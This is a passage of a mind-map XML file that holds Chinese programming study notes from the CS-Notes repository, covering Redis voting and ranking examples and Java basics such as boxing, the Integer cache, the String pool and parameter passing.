    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/87e4e7f891ae473ac58154674f36371678ed36e7305b6ac51abe1ccd7dc6dd85/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37633534646532312d653266662d343032652d626334322d3430333764653163313539322e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/87e4e7f891ae473ac58154674f36371678ed36e7305b6ac51abe1ccd7dc6dd85/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37633534646532312d653266662d343032652d626334322d3430333764653163313539322e706e67" width="400" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7c54de21-e2ff-402e-bc42-4037de1c1592.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_833410220" CREATED="1754750570180" MODIFIED="1754750570182"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      点赞功能
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 点赞功能" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#点赞功能">
</a>
    <p dir="auto">
      当有用户为一篇文章点赞时，除了要对该文章的 votes 字段进行加 1 操作，还必须记录该用户已经对该文章进行了点赞，防止用户点赞次数超过 1。可以建立文章的已投票用户集合来进行记录。
    </p>
    <p dir="auto">
      为了节约内存，规定一篇文章发布满一周之后，就不能再对它进行投票，而文章的已投票集合也会被删除，可以为文章的已投票集合设置一个一周的过期时间就能实现这个规定。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/cbe672a2877eeb16e454916e58db4e8351b7f1eeccd0c44f29912ad26c6d4fbf/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34383566646633342d636366382d343138352d393763362d3137333734656537313961302e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/cbe672a2877eeb16e454916e58db4e8351b7f1eeccd0c44f29912ad26c6d4fbf/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34383566646633342d636366382d343138352d393763362d3137333734656537313961302e706e67" width="400" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/485fdf34-ccf8-4185-97c6-17374ee719a0.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1807691286" CREATED="1754750570182" MODIFIED="1754750570184"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      对文章进行排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 对文章进行排序" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#对文章进行排序">
</a>
    <p dir="auto">
      为了按发布时间和点赞数进行排序，可以建立一个文章发布时间的有序集合和一个文章点赞数的有序集合。（下图中的 score 就是这里所说的点赞数；下面所示的有序集合分值并不直接是时间和点赞数，而是根据时间和点赞数间接计算出来的）
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0d4f5b959a7e8ea7210f60d48d8a505cc0a2b8de6159d198447ea2dbfc09ef9a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66376431373061332d653434362d346136342d616332642d6362393530323866383161382e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/0d4f5b959a7e8ea7210f60d48d8a505cc0a2b8de6159d198447ea2dbfc09ef9a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66376431373061332d653434362d346136342d616332642d6362393530323866383161382e706e67" width="800" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f7d170a3-e446-4a64-ac2d-cb95028f81a8.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1621965401" CREATED="1754750570184" MODIFIED="1754750570186"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        Carlson J L. Redis in Action[J]. Media.johnwiley.com.au, 2013.
      </li>
      <li>
        <a href="http://redisbook.com/index.html" rel="nofollow">黄健宏. Redis 设计与实现 [M]. 机械工业出版社, 2014.</a>
      </li>
      <li>
        <a href="https://redislabs.com/ebook/foreword/" rel="nofollow">REDIS IN ACTION</a>
      </li>
      <li>
        <a href="http://ticki.github.io/blog/skip-lists-done-right/" rel="nofollow">Skip Lists: Done Right</a>
      </li>
      <li>
        <a href="http://www.cnblogs.com/loveincode/p/7411911.html" rel="nofollow">论述 Redis 和 Memcached 的差异</a>
      </li>
      <li>
        <a href="http://wiki.jikexueyuan.com/project/redis-guide" rel="nofollow">Redis 3.0 中文版- 分片</a>
      </li>
      <li>
        <a href="http://www.scienjus.com/redis-use-case/" rel="nofollow">Redis 应用场景</a>
      </li>
      <li>
        <a href="https://redis.io/topics/lru-cache" rel="nofollow">Using Redis as an LRU cache</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" POSITION="top_or_left" ID="ID_1442765912" CREATED="1754749744675" MODIFIED="1754749807845" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>Java</strong>
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1099389118" CREATED="1754749807825" MODIFIED="1754750659767" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Java 基础
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1944485939" CREATED="1754750650285" MODIFIED="1754750650285"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、数据类型
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1891209790" CREATED="1754750650287" MODIFIED="1754750650291"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      基本类型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 基本类型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#基本类型">
</a>
    <ul dir="auto">
      <li>
        byte/8
      </li>
      <li>
        char/16
      </li>
      <li>
        short/16
      </li>
      <li>
        int/32
      </li>
      <li>
        float/32
      </li>
      <li>
        long/64
      </li>
      <li>
        double/64
      </li>
      <li>
        boolean/~
      </li>
    </ul>
    <p dir="auto">
      boolean 只有两个值：true、false，可以使用 1 bit 来存储，但是具体大小没有明确规定。JVM 会在编译时期将 boolean 类型的数据转换为 int，使用 1 来表示 true，0 表示 false。JVM 支持 boolean 数组，但是是通过读写 byte 数组来实现的。
    </p>
    <ul dir="auto">
      <li>
        <a href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html" rel="nofollow">Primitive Data Types</a>
      </li>
      <li>
        <a href="https://docs.oracle.com/javase/specs/jvms/se8/jvms8.pdf" rel="nofollow">The Java® Virtual Machine Specification</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_571316022" CREATED="1754750650291" MODIFIED="1754750650293"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      包装类型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 包装类型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#包装类型">
</a>
    <p dir="auto">
      基本类型都有对应的包装类型，基本类型与其对应的包装类型之间的赋值使用自动装箱与拆箱完成。
    </p>
    <pre>Integer x = 2;     // 装箱 调用了 Integer.valueOf(2)
int y = x;         // 拆箱 调用了 X.intValue()</pre>
    <ul dir="auto">
      <li>
        <a href="https://docs.oracle.com/javase/tutorial/java/data/autoboxing.html" rel="nofollow">Autoboxing and Unboxing</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1544406435" CREATED="1754750650294" MODIFIED="1754750650297"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      缓存池
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 缓存池" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#缓存池">
</a>
    <p dir="auto">
      new Integer(123) 与 Integer.valueOf(123) 的区别在于：
    </p>
    <ul dir="auto">
      <li>
        new Integer(123) 每次都会新建一个对象；
      </li>
      <li>
        Integer.valueOf(123) 会使用缓存池中的对象，多次调用会取得同一个对象的引用。
      </li>
    </ul>
    <pre>Integer x = new Integer(123);
Integer y = new Integer(123);
System.out.println(x == y);    // false
Integer z = Integer.valueOf(123);
Integer k = Integer.valueOf(123);
System.out.println(z == k);   // true</pre>
    <p dir="auto">
      valueOf() 方法的实现比较简单，就是先判断值是否在缓存池中，如果在的话就直接返回缓存池的内容。
    </p>
    <pre>public static Integer valueOf(int i) {
    if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)
        return IntegerCache.cache[i + (-IntegerCache.low)];
    return new Integer(i);
}</pre>
    <p dir="auto">
      在 Java 8 中，Integer 缓存池的大小默认为 -128~127。
    </p>
    <pre>static final int low = -128;
static final int high;
static final Integer cache[];
static {
    // high value may be configured by property
    int h = 127;
    String integerCacheHighPropValue =
        sun.misc.VM.getSavedProperty(&quot;java.lang.Integer.IntegerCache.high&quot;);
    if (integerCacheHighPropValue != null) {
        try {
            int i = parseInt(integerCacheHighPropValue);
            i = Math.max(i, 127);
            // Maximum array size is Integer.MAX_VALUE
            h = Math.min(i, Integer.MAX_VALUE - (-low) -1);
        } catch( NumberFormatException nfe) {
            // If the property cannot be parsed into an int, ignore it.
        }
    }
    high = h;
    cache = new Integer[(high - low) + 1];
    int j = low;
    for(int k = 0; k &lt; cache.length; k++)
        cache[k] = new Integer(j++);
    // range [-128, 127] must be interned (JLS7 5.1.7)
    assert IntegerCache.high &gt;= 127;
}</pre>
    <p dir="auto">
      编译器会在自动装箱过程调用 valueOf() 方法，因此多个值相同且值在缓存池范围内的 Integer 实例使用自动装箱来创建，那么就会引用相同的对象。
    </p>
    <pre>Integer m = 123;
Integer n = 123;
System.out.println(m == n); // true</pre>
    <p dir="auto">
      基本类型对应的缓冲池如下：
    </p>
    <ul dir="auto">
      <li>
        boolean values true and false
      </li>
      <li>
        all byte values
      </li>
      <li>
        short values between -128 and 127
      </li>
      <li>
        int values between -128 and 127
      </li>
      <li>
        char in the range \u0000 to \u007F
      </li>
    </ul>
    <p dir="auto">
      在使用这些基本类型对应的包装类型时，如果该数值范围在缓冲池范围内，就可以直接使用缓冲池中的对象。
    </p>
    <p dir="auto">
      在 jdk 1.8 所有的数值类缓冲池中，Integer 的缓冲池 IntegerCache 很特殊，这个缓冲池的下界是 - 128，上界默认是 127，但是这个上界是可调的，在启动 jvm 的时候，通过 -XX:AutoBoxCacheMax=&lt;size&gt; 来指定这个缓冲池的大小，该选项在 JVM 初始化的时候会设定一个名为 java.lang.IntegerCache.high 系统属性，然后 IntegerCache 初始化的时候就会读取该系统属性来决定上界。
    </p>
    <p dir="auto">
      <a href="https://stackoverflow.com/questions/9030817/differences-between-new-integer123-integer-valueof123-and-just-123" rel="nofollow">StackOverflow : Differences between new Integer(123), Integer.valueOf(123) and just 123</a>
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_697416784" CREATED="1754750650297" MODIFIED="1754750650297"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、String
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1429279198" CREATED="1754750650299" MODIFIED="1754750650301"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      概览
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 概览" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#概览">
</a>
    <p dir="auto">
      String 被声明为 final，因此它不可被继承。(Integer 等包装类也不能被继承）
    </p>
    <p dir="auto">
      在 Java 8 中，String 内部使用 char 数组存储数据。
    </p>
    <pre>public final class String
    implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence {
    /** The value is used for character storage. */
    private final char value[];
}</pre>
    <p dir="auto">
      在 Java 9 之后，String 类的实现改用 byte 数组存储字符串，同时使用 <code>coder</code>&#xa0;来标识使用了哪种编码。
    </p>
    <pre>public final class String
    implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence {
    /** The value is used for character storage. */
    private final byte[] value;
    /** The identifier of the encoding used to encode the bytes in {@code value}. */
    private final byte coder;
}</pre>
    <p dir="auto">
      value 数组被声明为 final，这意味着 value 数组初始化之后就不能再引用其它数组。并且 String 内部没有改变 value 数组的方法，因此可以保证 String 不可变。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1673218158" CREATED="1754750650302" MODIFIED="1754750650305"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      不可变的好处
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 不可变的好处" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#不可变的好处">
</a>
    <p dir="auto">
      <strong>1. 可以缓存 hash 值</strong>
    </p>
    <p dir="auto">
      因为 String 的 hash 值经常被使用，例如 String 用做 HashMap 的 key。不可变的特性可以使得 hash 值也不可变，因此只需要进行一次计算。
    </p>
    <p dir="auto">
      <strong>2. String Pool 的需要</strong>
    </p>
    <p dir="auto">
      如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2141a62f319d75a521ce145c8079ddfbfbdcc8e261dbf88980f8e2badffdcbda/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313231303030343133323839342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/2141a62f319d75a521ce145c8079ddfbfbdcc8e261dbf88980f8e2badffdcbda/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313231303030343133323839342e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191210004132894.png"/>
    </a><br/>
    

    <p dir="auto">
      <strong>3. 安全性</strong>
    </p>
    <p dir="auto">
      String 经常作为参数，String 不可变性可以保证参数不可变。例如在作为网络连接参数的情况下如果 String 是可变的，那么在网络连接过程中，String 被改变，改变 String 的那一方以为现在连接的是其它主机，而实际情况却不一定是。
    </p>
    <p dir="auto">
      <strong>4. 线程安全</strong>
    </p>
    <p dir="auto">
      String 不可变性天生具备线程安全，可以在多个线程中安全地使用。
    </p>
    <p dir="auto">
      <a href="https://www.programcreek.com/2013/04/why-string-is-immutable-in-java/" rel="nofollow">Program Creek : Why String is immutable in Java?</a>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_464218579" CREATED="1754750650306" MODIFIED="1754750650308"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      String, StringBuffer and StringBuilder
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: String, StringBuffer and StringBuilder" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#string-stringbuffer-and-stringbuilder">
</a>
    <p dir="auto">
      <strong>1. 可变性</strong>
    </p>
    <ul dir="auto">
      <li>
        String 不可变
      </li>
      <li>
        StringBuffer 和 StringBuilder 可变
      </li>
    </ul>
    <p dir="auto">
      <strong>2. 线程安全</strong>
    </p>
    <ul dir="auto">
      <li>
        String 不可变，因此是线程安全的
      </li>
      <li>
        StringBuilder 不是线程安全的
      </li>
      <li>
        StringBuffer 是线程安全的，内部使用 synchronized 进行同步
      </li>
    </ul>
    <p dir="auto">
      <a href="https://stackoverflow.com/questions/2971315/string-stringbuffer-and-stringbuilder" rel="nofollow">StackOverflow : String, StringBuffer, and StringBuilder</a>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1276443790" CREATED="1754750650308" MODIFIED="1754750650311"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      String Pool
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: String Pool" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#string-pool">
</a>
    <p dir="auto">
      字符串常量池（String Pool）保存着所有字符串字面量（literal strings），这些字面量在编译时期就确定。不仅如此，还可以使用 String 的 intern() 方法在运行过程将字符串添加到 String Pool 中。
    </p>
    <p dir="auto">
      当一个字符串调用 intern() 方法时，如果 String Pool 中已经存在一个字符串和该字符串值相等（使用 equals() 方法进行确定），那么就会返回 String Pool 中字符串的引用；否则，就会在 String Pool 中添加一个新的字符串，并返回这个新字符串的引用。
    </p>
    <p dir="auto">
      下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同字符串，而 s3 和 s4 是通过 s1.intern() 和 s2.intern() 方法取得同一个字符串引用。intern() 首先把 &quot;aaa&quot; 放到 String Pool 中，然后返回这个字符串引用，因此 s3 和 s4 引用的是同一个字符串。
    </p>
    <pre>String s1 = new String(&quot;aaa&quot;);
String s2 = new String(&quot;aaa&quot;);
System.out.println(s1 == s2);           // false
String s3 = s1.intern();
String s4 = s2.intern();
System.out.println(s3 == s4);           // true</pre>
    <p dir="auto">
      如果是采用 &quot;bbb&quot; 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。
    </p>
    <pre>String s5 = &quot;bbb&quot;;
String s6 = &quot;bbb&quot;;
System.out.println(s5 == s6);  // true</pre>
    <p dir="auto">
      在 Java 7 之前，String Pool 被放在运行时常量池中，它属于永久代。而在 Java 7，String Pool 被移到堆中。这是因为永久代的空间有限，在大量使用字符串的场景下会导致 OutOfMemoryError 错误。
    </p>
    <ul dir="auto">
      <li>
        <a href="https://stackoverflow.com/questions/10578984/what-is-string-interning" rel="nofollow">StackOverflow : What is String interning?</a>
      </li>
      <li>
        <a href="https://tech.meituan.com/in_depth_understanding_string_intern.html" rel="nofollow">深入解析 String#intern</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_22514567" CREATED="1754750650312" MODIFIED="1754750650315"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      new String(&quot;abc&quot;)
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: new String(&quot;abc&quot;)" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#new-stringabc">
</a>
    <p dir="auto">
      使用这种方式一共会创建两个字符串对象（前提是 String Pool 中还没有 &quot;abc&quot; 字符串对象）。
    </p>
    <ul dir="auto">
      <li>
        &quot;abc&quot; 属于字符串字面量，因此编译时期会在 String Pool 中创建一个字符串对象，指向这个 &quot;abc&quot; 字符串字面量；
      </li>
      <li>
        而使用 new 的方式会在堆中创建一个字符串对象。
      </li>
    </ul>
    <p dir="auto">
      创建一个测试类，其 main 方法中使用这种方式来创建字符串对象。
    </p>
    <pre>public class NewStringTest {
    public static void main(String[] args) {
        String s = new String(&quot;abc&quot;);
    }
}</pre>
    <p dir="auto">
      使用 javap -verbose 进行反编译，得到以下内容：
    </p>
    <pre>// ...
Constant pool:
// ...
   #2 = Class              #18            // java/lang/String
   #3 = String             #19            // abc
// ...
  #18 = Utf8               java/lang/String
  #19 = Utf8               abc
// ...
  public static void main(java.lang.String[]);
    descriptor: ([Ljava/lang/String;)V
    flags: ACC_PUBLIC, ACC_STATIC
    Code:
      stack=3, locals=2, args_size=1
         0: new           #2                  // class java/lang/String
         3: dup
         4: ldc           #3                  // String abc
         6: invokespecial #4                  // Method java/lang/String.&quot;&lt;init&gt;&quot;:(Ljava/lang/String;)V
         9: astore_1
// ...</pre>
    <p dir="auto">
      在 Constant Pool 中，#19 存储这字符串字面量 &quot;abc&quot;，#3 是 String Pool 的字符串对象，它指向 #19 这个字符串字面量。在 main 方法中，0: 行使用 new #2 在堆中创建一个字符串对象，并且使用 ldc #3 将 String Pool 中的字符串对象作为 String 构造函数的参数。
    </p>
    <p dir="auto">
      以下是 String 构造函数的源码，可以看到，在将一个字符串对象作为另一个字符串对象的构造函数参数时，并不会完全复制 value 数组内容，而是都会指向同一个 value 数组。
    </p>
    <pre>public String(String original) {
    this.value = original.value;
    this.hash = original.hash;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1199101993" CREATED="1754750650316" MODIFIED="1754750650316"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、运算
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_523474295" CREATED="1754750650318" MODIFIED="1754750650320"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参数传递
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参数传递" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#参数传递">
</a>
    <p dir="auto">
      Java 的参数是以值传递的形式传入方法中，而不是引用传递。
    </p>
    <p dir="auto">
      以下代码中 Dog dog 的 dog 是一个指针，存储的是对象的地址。在将一个参数传入一个方法时，本质上是将对象的地址以值的方式传递到形参中。
    </p>
    <pre>public class Dog {
    String name;
    Dog(String name) {
        this.name = name;
    }
    String getName() {
        return this.name;
    }
    void setName(String name) {
        this.name = name;
    }
    String getObjectAddress() {
        return super.toString();
    }
}</pre>
    <p dir="auto">
      在方法中改变对象的字段值会改变原对象该字段值，因为引用的是同一个对象。
    </p>
    <pre>class PassByValueExample {
    public static void main(String[] args) {
        Dog dog = new Dog(&quot;A&quot;);
        func(dog);
        System.out.println(dog.getName());          // B
    }
    private static void func(Dog dog) {
        dog.setName(&quot;B&quot;);
    }
}</pre>
    <p dir="auto">
      但是在方法中将指针引用了其它对象，那么此时方法里和方法外的两个指针指向了不同的对象，在一个指针改变其所指向对象的内容对另一个指针所指向的对象没有影响。
    </p>
    <pre>public class PassByValueExample {
    public static void main(String[] args) {
        Dog dog = new Dog(&quot;A&quot;);
        System.out.println(dog.getObjectAddress()); // Dog@4554617c
        func(dog);
        System.out.println(dog.getObjectAddress()); // Dog@4554617c
        System.out.println(dog.getName());          // A
    }
    private static void func(Dog dog) {
        System.out.println(dog.getObjectAddress()); // Dog@4554617c
        dog = new Dog(&quot;B&quot;);
        System.out.println(dog.getObjectAddress()); // Dog@74a14482
        System.out.println(dog.getName());          // B
    }
}</pre>
    <p dir="auto">
      <a href="https://stackoverflow.com/questions/40480/is-java-pass-by-reference-or-pass-by-value" rel="nofollow">StackOverflow: Is Java “pass-by-reference” or “pass-by-value”?</a>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_163688589" CREATED="1754750650321" MODIFIED="1754750650323"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      float 与 double
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: float 与 double" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#float-与-double">
</a>
    <p dir="auto">
      Java 不能隐式执行向下转型，因为这会使得精度降低。
    </p>
    <p dir="auto">
      1.1 字面量属于 double 类型，不能直接将 1.1 直接赋值给 float 变量，因为这是向下转型。
    </p>
    <pre>// float f = 1.1;</pre>
    <p dir="auto">
      1.1f 字面量才是 float 类型。
    </p>
    <pre>float f = 1.1f;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_551400506" CREATED="1754750650323" MODIFIED="1754750650325"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      隐式类型转换
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 隐式类型转换" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#隐式类型转换">
</a>
    <p dir="auto">
      因为字面量 1 是 int 类型，它比 short 类型精度要高，因此不能隐式地将 int 类型向下转型为 short 类型。
    </p>
    <pre>short s1 = 1;
// s1 = s1 + 1;</pre>
    <p dir="auto">
      但是使用 += 或者 ++ 运算符会执行隐式类型转换。
    </p>
    <pre>s1 += 1;
s1++;</pre>
    <p dir="auto">
      上面的语句相当于将 s1 + 1 的计算结果进行了向下转型：
    </p>
    <pre>s1 = (short) (s1 + 1);</pre>
    <p dir="auto">
      <a href="https://stackoverflow.com/questions/8710619/why-dont-javas-compound-assignment-operators-require-casting" rel="nofollow">StackOverflow : Why don't Java's +=, -=, *=, /= compound assignment operators require casting?</a>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1803493778" CREATED="1754750650325" MODIFIED="1754750650327"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      switch
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: switch" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#switch">
</a>
    <p dir="auto">
      从 Java 7 开始，可以在 switch 条件判断语句中使用 String 对象。
    </p>
    <pre>String s = &quot;a&quot;;
switch (s) {
    case &quot;a&quot;:
        System.out.println(&quot;aaa&quot;);
        break;
    case &quot;b&quot;:
        System.out.println(&quot;bbb&quot;);
        break;
}</pre>
    <p dir="auto">
      switch 不支持 long、float、double，是因为 switch 的设计初衷是对那些只有少数几个值的类型进行等值判断，如果值过于复杂，那么还是用 if 比较合适。
    </p>
    <pre>// long x = 111;
// switch (x) { // Incompatible types. Found: 'long', required: 'char, byte, short, int, Character, Byte, Short, Integer, String, or an enum'
//     case 111:
//         System.out.println(111);
//         break;
//     case 222:
//         System.out.println(222);
//         break;
// }</pre>
    <p dir="auto">
      <a href="https://stackoverflow.com/questions/2676210/why-cant-your-switch-statement-data-type-be-long-java" rel="nofollow">StackOverflow : Why can't your switch statement data type be long, Java?</a>
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1134454260" CREATED="1754750650327" MODIFIED="1754750650327"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、关键字
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_315108771" CREATED="1754750650329" MODIFIED="1754750650330"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      final
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: final" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#final">
</a>
    <p dir="auto">
      <strong>1. 数据</strong>
    </p>
    <p dir="auto">
      声明数据为常量，可以是编译时常量，也可以是在运行时被初始化后不能被改变的常量。
    </p>
    <ul dir="auto">
      <li>
        对于基本类型，final 使数值不变；
      </li>
      <li>
        对于引用类型，final 使引用不变，也就不能引用其它对象，但是被引用的对象本身是可以修改的。
      </li>
    </ul>
    <pre>final int x = 1;
// x = 2;  // cannot assign value to final variable 'x'
final A y = new A();
y.a = 1;</pre>
    <p dir="auto">
      <strong>2. 方法</strong>
    </p>
    <p dir="auto">
      声明方法不能被子类重写。
    </p>
    <p dir="auto">
      private 方法隐式地被指定为 final，如果在子类中定义的方法和基类中的一个 private 方法签名相同，此时子类的方法不是重写基类方法，而是在子类中定义了一个新的方法。
    </p>
    <p dir="auto">
      <strong>3. 类</strong>
    </p>
    <p dir="auto">
      声明类不允许被继承。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_843502233" CREATED="1754750650331" MODIFIED="1754750650333"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      static
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: static" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md#static">
